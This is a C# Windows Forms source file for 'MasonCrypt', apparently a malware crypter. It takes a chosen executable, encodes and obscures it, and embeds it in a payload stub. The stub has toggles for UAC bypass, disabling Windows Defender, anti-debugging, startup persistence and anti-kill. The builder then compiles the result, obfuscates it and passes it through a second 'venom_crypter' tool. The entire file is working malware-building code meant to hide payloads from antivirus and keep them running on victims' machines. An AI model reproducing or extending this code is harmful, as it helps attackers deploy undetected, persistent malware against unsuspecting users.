using downloader;
using MasonCrypt.build;
using MasonCrypt.Properties;
using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Forms;
using System;
using System.IO;
using System.Windows.Forms;
using SimpleObfuscator;
using System.Diagnostics;
using System.Text;

namespace MasonCrypt
{
    public partial class Form1 : MetroForm
    {
        public Form1()
        {
            InitializeComponent();
            var styleManager = new MetroStyleManager();
            styleManager.Theme = MetroThemeStyle.Dark;
            styleManager.Style = MetroFramework.MetroColorStyle.Silver;
            styleManager.Owner = this;
        }

        private string Encrypt(string input)
        {
            input = input.Replace("A", "ス").Replace("v", "国").Replace("T", "日").Replace("M", "本");
            return input;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            sleep.Text = "4";
        }

        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            var result = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }

            return result.ToString();
        }
        private void gen_Click(object sender, EventArgs e)
        {
            string filePath = this.path.Text;
            if (File.Exists(filePath))
            {
                bool bypassUAC = uacbypass.Checked;
                bool disableWD = wddisable.Checked;
                bool enantidbg = antidebug.Checked;
                bool addtostartup = startup.Checked;
                bool nokill = antikill.Checked;
                string randomString = GenerateRandomString(10);
                string filenamenew = randomString + ".exe";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string encryptedText = Encrypt(Convert.ToBase64String(fileBytes));
                string hacker = Resources.PAYLOAD;
                hacker = hacker.Replace("masonecrypto", encryptedText).Replace("masoncryptrt", (int.Parse(sleep.Text) * 1000).ToString()).Replace("bypassUAC", bypassUAC.ToString()).Replace("disableWD", disableWD.ToString()).Replace("enantidbg", enantidbg.ToString()).Replace("addtostartup", addtostartup.ToString()).Replace("nokill", nokill.ToString()).Replace("startupnamexd", randomString);
                Builder builder = new Builder
                {
                    StubCs = hacker,
                    SaveFileName = filenamenew,
                    TempDirectory = Path.Combine(Environment.CurrentDirectory, "temp"),
                };

                Compiler compiler = new Compiler();
                string result = compiler.Compile(builder);
                SimpleObfuscator.Obfuscator.Save(File.ReadAllBytes(filenamenew), filenamenew);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "Core\\venom_crypter.exe",
                    Arguments = filenamenew,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WorkingDirectory = System.IO.Directory.GetCurrentDirectory()
            };
                Process process = new Process
                {
                    StartInfo = startInfo
                };
                process.Start();
                process.WaitForExit();
                File.Delete(filenamenew);
                File.Move(filenamenew+"venomcrypted.exe", filenamenew);
                MessageBox.Show(result);
            }
            else
            {
                MessageBox.Show("File not found.");
            }

        }


        private void Browserbutton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                openFileDialog.RestoreDirectory = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedFilePath = openFileDialog.FileName;
                    path.Text = selectedFilePath;
                }
            }
        }

        private void sleep_Click(object sender, EventArgs e)
        {

        }

        private void aboubtn_Click(object sender, EventArgs e)
        {
            about_window form3 = new about_window();
            form3.ShowDialog();
        }
    }
}
